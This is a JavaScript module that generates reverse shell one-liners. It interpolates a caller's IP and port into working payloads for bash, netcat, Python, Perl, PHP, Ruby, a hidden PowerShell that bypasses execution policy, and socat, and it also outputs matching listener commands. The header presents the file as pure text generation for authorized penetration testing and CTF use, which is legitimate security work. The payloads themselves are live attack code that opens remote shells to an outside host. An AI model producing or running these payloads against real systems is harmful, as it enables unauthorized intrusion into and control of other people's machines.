/**
 * Reverse shell one-liner generator — PURE TEXT GENERATION ONLY.
 *
 * This module never opens a socket, never executes a command, and never
 * accepts or resolves a "target" — it only interpolates an IP and port
 * the caller typed into a fixed set of well-known public one-liner
 * templates (the same ones long published on revshells.com, PayloadsAll-
 * TheThings, and pentestmonkey's cheat sheet) and returns them as
 * strings for the caller to paste into a listener/shell THEY control.
 *
 * For authorized penetration testing and CTF use only.
 */

export const SHELL_TYPES = [
  'bash', 'nc-e', 'nc-mkfifo', 'python', 'python3', 'perl', 'php', 'ruby', 'powershell', 'socat'
];

const SHELL_LABELS = {
  bash: 'Bash (/dev/tcp)',
  'nc-e': 'netcat (-e)',
  'nc-mkfifo': 'netcat (no -e, mkfifo)',
  python: 'Python 2',
  python3: 'Python 3',
  perl: 'Perl',
  php: 'PHP',
  ruby: 'Ruby',
  powershell: 'PowerShell',
  socat: 'socat'
};

function validateIpPort(ip, port) {
  if (!ip || !ip.trim()) throw new Error('Enter an IP/host for your listener');
  const p = Number(port);
  if (!Number.isInteger(p) || p < 1 || p > 65535) throw new Error('Port must be an integer between 1 and 65535');
  return { ip: ip.trim(), port: p };
}

function buildPayload(shellType, ip, port) {
  switch (shellType) {
    case 'bash':
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    case 'nc-e':
      return `nc -e /bin/sh ${ip} ${port}`;
    case 'nc-mkfifo':
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`;
    case 'python':
      return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`;
    case 'python3':
      return `python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`;
    case 'perl':
      return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
    case 'php':
      return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    case 'ruby':
      return `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
    case 'powershell':
      return `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('${ip}',${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
    case 'socat':
      return `socat TCP:${ip}:${port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`;
    default:
      throw new Error('Unknown shell type: ' + shellType);
  }
}

function buildListener(shellType, port) {
  if (shellType === 'socat') return `socat TCP-LISTEN:${port},reuseaddr,fork FILE:\`tty\`,raw,echo=0`;
  return `nc -lvnp ${port}`;
}

/**
 * @param {{ ip: string, port: number|string, shellType: string }} opts
 * @returns {{ payload: string, listener: string, label: string }}
 */
export function generateReverseShell({ ip, port, shellType }) {
  if (!SHELL_TYPES.includes(shellType)) throw new Error('Unsupported shell type: ' + shellType);
  const { ip: cleanIp, port: cleanPort } = validateIpPort(ip, port);
  return {
    payload: buildPayload(shellType, cleanIp, cleanPort),
    listener: buildListener(shellType, cleanPort),
    label: SHELL_LABELS[shellType]
  };
}

export { SHELL_LABELS };
